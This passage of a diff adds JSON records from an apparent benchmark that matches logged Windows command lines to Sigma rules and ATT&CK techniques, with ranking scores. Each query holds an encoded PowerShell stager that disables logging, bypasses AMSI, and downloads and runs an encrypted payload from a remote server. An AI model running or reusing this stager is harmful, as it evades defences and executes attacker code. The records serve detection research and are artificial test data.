+      "query": "C:\\Windows\\System32\\cmd.exe C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyACkAewAkADcAMQAyAEQAQgA9ACQANAAzAEQARQAyAC4ARwBlAHQAVgBhAEwAdQBFACgAJABOAHUAbABsACkAOwBJAGYAKAAkADcAMQAyAEQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAGQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBEAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAEEAbAA9AFsAQwBvAEwATABFAEMAVABJAE8AbgBzAC4ARwBlAG4AZQByAGkAYwAuAEQASQBDAHQASQBPAG4AYQByAHkAWwBzAHQAcgBpAG4ARwAsAFMAeQBzAHQAZQBNAC4ATwBCAEoARQBDAHQAXQBdADoAOgBOAGUAdwAoACkAOwAkAHYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBsAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANwAxADIAZABCAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAYQBMAH0ARQBMAHMARQB7AFsAUwBDAFIAaQBQAFQAQgBMAG8AQwBrAF0ALgAiAEcARQBUAEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAE4AdQBsAGwALAAoAE4ARQB3AC0ATwBCAEoARQBDAFQAIABDAE8AbABsAEUAYwBUAGkATwBOAHMALgBHAGUAbgBFAFIASQBDAC4ASABBAHMAaABTAGUAdABbAFMAdABSAGkAbgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBFAEYAXQAuAEEAcwBzAEUATQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAEwALAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAeQBTAFQAZQBtAC4ATgBFAHQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AdABNAEEATgBBAGcARQBSAF0AOgA6AEUAWABwAGUAYwB0ADEAMAAwAEMAbwBOAHQASQBuAHUARQA9ADAAOwAkADgAZgA1AEIAOQA9AE4ARQBXAC0ATwBiAGoAZQBjAHQAIABTAFkAUwBUAGUATQAuAE4AZQB0AC4AVwBFAEIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AYwBPAGQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQARQAuAEcARQBUAFMAVAByAGkAbgBnACgAWwBDAG8AbgBWAEUAcgB0AF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AHIAaQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADgAZgA1AEIAOQAuAEgAZQBhAEQAZQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADgAZgA1AGIAOQAuAFAAcgBPAHgAWQA9AFsAUwB5AHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAFUARQBzAHQAXQA6ADoARABlAGYAYQBVAEwAdABXAGUAYgBQAFIATwB4AFkAOwAkADgARgA1AGIAOQAuAFAAcgBPAFgAeQAuAEMAcgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBTAHQAZQBtAC4ATgBlAHQALgBDAFIAZQBEAGUATgBUAEkAQQBsAEMAYQBDAEgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4ARQBUAHcATwByAGsAQwByAEUARABFAE4AVABpAGEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADgAZgA1AGIAOQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABFAG0ALgBUAGUAeABUAC4ARQBuAGMAbwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAcwAoACcAMABdAHIAWAAzAFkANAA6ACgAKQBKAGMAaABBAEsAawBSADcAVgBnACsAWwAvAFUAcAA5ADIAdABtAEcAUQB2ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAOABmADUAQgA5AC4ASABlAGEARABFAFIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AFAARgBqAE4AMQBIAHAAcgAyAE4ANwBiAGEAZgBlAGMAdwBXAC8ARwBiAG8AUwBNAHoAZwA0AD0AIgApADsAJABEAGEAdABBAD0AJAA4AGYANQBCADkALgBEAE8AVwBuAGwATwBhAGQARABBAFQAQQAoACQAcwBFAHIAKwAkAHQAKQA7ACQAaQBWAD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABEAEEAdABBAFsANAAuAC4AJABEAEEAdABhAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAEkATgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA= C:\\Windows\\System32\\services.exe C:\\windows\\system32\\services.exe",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1569.002"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.3391602052736161,
+      "n_relevant": 9,
+      "top": [
+        "2a072a96-a086-49fa-bcb5-15cc5a619093",
+        "62b20d44-1546-4e61-afce-8e175eb9473c",
+        "c49c5062-0966-4170-9efd-9968c913a6cf",
+        "17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8",
+        "ac175779-025a-4f12-98b0-acdaeb77ea85"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-176",
+      "query": "Image: C:\\Windows\\System32\\cmd.exe\nCommandLine: C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyACkAewAkADcAMQAyAEQAQgA9ACQANAAzAEQARQAyAC4ARwBlAHQAVgBhAEwAdQBFACgAJABOAHUAbABsACkAOwBJAGYAKAAkADcAMQAyAEQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAGQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBEAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAEEAbAA9AFsAQwBvAEwATABFAEMAVABJAE8AbgBzAC4ARwBlAG4AZQByAGkAYwAuAEQASQBDAHQASQBPAG4AYQByAHkAWwBzAHQAcgBpAG4ARwAsAFMAeQBzAHQAZQBNAC4ATwBCAEoARQBDAHQAXQBdADoAOgBOAGUAdwAoACkAOwAkAHYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBsAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANwAxADIAZABCAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAYQBMAH0ARQBMAHMARQB7AFsAUwBDAFIAaQBQAFQAQgBMAG8AQwBrAF0ALgAiAEcARQBUAEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAE4AdQBsAGwALAAoAE4ARQB3AC0ATwBCAEoARQBDAFQAIABDAE8AbABsAEUAYwBUAGkATwBOAHMALgBHAGUAbgBFAFIASQBDAC4ASABBAHMAaABTAGUAdABbAFMAdABSAGkAbgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBFAEYAXQAuAEEAcwBzAEUATQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAEwALAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAeQBTAFQAZQBtAC4ATgBFAHQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AdABNAEEATgBBAGcARQBSAF0AOgA6AEUAWABwAGUAYwB0ADEAMAAwAEMAbwBOAHQASQBuAHUARQA9ADAAOwAkADgAZgA1AEIAOQA9AE4ARQBXAC0ATwBiAGoAZQBjAHQAIABTAFkAUwBUAGUATQAuAE4AZQB0AC4AVwBFAEIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AYwBPAGQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQARQAuAEcARQBUAFMAVAByAGkAbgBnACgAWwBDAG8AbgBWAEUAcgB0AF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AHIAaQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADgAZgA1AEIAOQAuAEgAZQBhAEQAZQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADgAZgA1AGIAOQAuAFAAcgBPAHgAWQA9AFsAUwB5AHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAFUARQBzAHQAXQA6ADoARABlAGYAYQBVAEwAdABXAGUAYgBQAFIATwB4AFkAOwAkADgARgA1AGIAOQAuAFAAcgBPAFgAeQAuAEMAcgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBTAHQAZQBtAC4ATgBlAHQALgBDAFIAZQBEAGUATgBUAEkAQQBsAEMAYQBDAEgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4ARQBUAHcATwByAGsAQwByAEUARABFAE4AVABpAGEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADgAZgA1AGIAOQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABFAG0ALgBUAGUAeABUAC4ARQBuAGMAbwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAcwAoACcAMABdAHIAWAAzAFkANAA6ACgAKQBKAGMAaABBAEsAawBSADcAVgBnACsAWwAvAFUAcAA5ADIAdABtAEcAUQB2ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAOABmADUAQgA5AC4ASABlAGEARABFAFIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AFAARgBqAE4AMQBIAHAAcgAyAE4ANwBiAGEAZgBlAGMAdwBXAC8ARwBiAG8AUwBNAHoAZwA0AD0AIgApADsAJABEAGEAdABBAD0AJAA4AGYANQBCADkALgBEAE8AVwBuAGwATwBhAGQARABBAFQAQQAoACQAcwBFAHIAKwAkAHQAKQA7ACQAaQBWAD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABEAEEAdABBAFsANAAuAC4AJABEAEEAdABhAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAEkATgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\windows\\system32\\services.exe",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1569.002"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.3391602052736161,
+      "n_relevant": 9,
+      "top": [
+        "2a072a96-a086-49fa-bcb5-15cc5a619093",
+        "62b20d44-1546-4e61-afce-8e175eb9473c",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "05a2ab7e-ce11-4b63-86db-ab32e763e11d",
+        "fb843269-508c-4b76-8b8d-88679db22ce7"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-176",
+      "query": "C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyACkAewAkADcAMQAyAEQAQgA9ACQANAAzAEQARQAyAC4ARwBlAHQAVgBhAEwAdQBFACgAJABOAHUAbABsACkAOwBJAGYAKAAkADcAMQAyAEQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAGQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBEAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAEEAbAA9AFsAQwBvAEwATABFAEMAVABJAE8AbgBzAC4ARwBlAG4AZQByAGkAYwAuAEQASQBDAHQASQBPAG4AYQByAHkAWwBzAHQAcgBpAG4ARwAsAFMAeQBzAHQAZQBNAC4ATwBCAEoARQBDAHQAXQBdADoAOgBOAGUAdwAoACkAOwAkAHYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBsAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANwAxADIAZABCAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAYQBMAH0ARQBMAHMARQB7AFsAUwBDAFIAaQBQAFQAQgBMAG8AQwBrAF0ALgAiAEcARQBUAEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAE4AdQBsAGwALAAoAE4ARQB3AC0ATwBCAEoARQBDAFQAIABDAE8AbABsAEUAYwBUAGkATwBOAHMALgBHAGUAbgBFAFIASQBDAC4ASABBAHMAaABTAGUAdABbAFMAdABSAGkAbgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBFAEYAXQAuAEEAcwBzAEUATQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAEwALAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAeQBTAFQAZQBtAC4ATgBFAHQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AdABNAEEATgBBAGcARQBSAF0AOgA6AEUAWABwAGUAYwB0ADEAMAAwAEMAbwBOAHQASQBuAHUARQA9ADAAOwAkADgAZgA1AEIAOQA9AE4ARQBXAC0ATwBiAGoAZQBjAHQAIABTAFkAUwBUAGUATQAuAE4AZQB0AC4AVwBFAEIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AYwBPAGQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQARQAuAEcARQBUAFMAVAByAGkAbgBnACgAWwBDAG8AbgBWAEUAcgB0AF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AHIAaQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADgAZgA1AEIAOQAuAEgAZQBhAEQAZQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADgAZgA1AGIAOQAuAFAAcgBPAHgAWQA9AFsAUwB5AHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAFUARQBzAHQAXQA6ADoARABlAGYAYQBVAEwAdABXAGUAYgBQAFIATwB4AFkAOwAkADgARgA1AGIAOQAuAFAAcgBPAFgAeQAuAEMAcgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBTAHQAZQBtAC4ATgBlAHQALgBDAFIAZQBEAGUATgBUAEkAQQBsAEMAYQBDAEgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4ARQBUAHcATwByAGsAQwByAEUARABFAE4AVABpAGEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADgAZgA1AGIAOQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABFAG0ALgBUAGUAeABUAC4ARQBuAGMAbwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAcwAoACcAMABdAHIAWAAzAFkANAA6ACgAKQBKAGMAaABBAEsAawBSADcAVgBnACsAWwAvAFUAcAA5ADIAdABtAEcAUQB2ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAOABmADUAQgA5AC4ASABlAGEARABFAFIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AFAARgBqAE4AMQBIAHAAcgAyAE4ANwBiAGEAZgBlAGMAdwBXAC8ARwBiAG8AUwBNAHoAZwA0AD0AIgApADsAJABEAGEAdABBAD0AJAA4AGYANQBCADkALgBEAE8AVwBuAGwATwBhAGQARABBAFQAQQAoACQAcwBFAHIAKw